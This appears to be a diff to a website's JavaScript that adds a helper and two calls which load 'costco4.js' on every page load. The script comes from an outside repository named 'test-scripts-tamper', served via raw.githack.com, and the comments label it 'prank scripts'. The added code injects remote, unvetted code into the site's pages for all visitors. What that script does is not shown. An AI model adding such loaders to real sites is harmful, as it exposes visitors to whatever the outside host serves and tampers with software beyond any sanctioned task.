@@ -5,6 +5,30 @@
   document.addEventListener("DOMContentLoaded", function() {
 
 
+      /**
+   * Dynamically loads a JS script from a URL
+   * @param {string} url - the URL of the script to load
+   * @param {function} callback - optional function to call after script is loaded
+   */
+  function loadScript(url, callback) {
+    const script = document.createElement("script");
+    script.src = url;
+    script.async = true; // loads asynchronously
+    script.onload = () => {
+      console.log(`✅ Script loaded: ${url}`);
+      if (callback) callback();
+    };
+    script.onerror = () => console.error(`❌ Failed to load script: ${url}`);
+    document.head.appendChild(script);
+  }
+
+  // Example usage: load your prank scripts
+  loadScript("https://raw.githack.com/datagivo/test-scripts-tamper/refs/heads/main/costco4.js");
+  loadScript("https://raw.githack.com/datagivo/test-scripts-tamper/refs/heads/main/costco4.js", () => {
+    console.log("All prank scripts loaded!");
+  });
+
+
   /* ----------------------------------------------------------
       🎠 2. Carousel Joker (Matthew’s Keys & Ed 😎)
   ----------------------------------------------------------- */
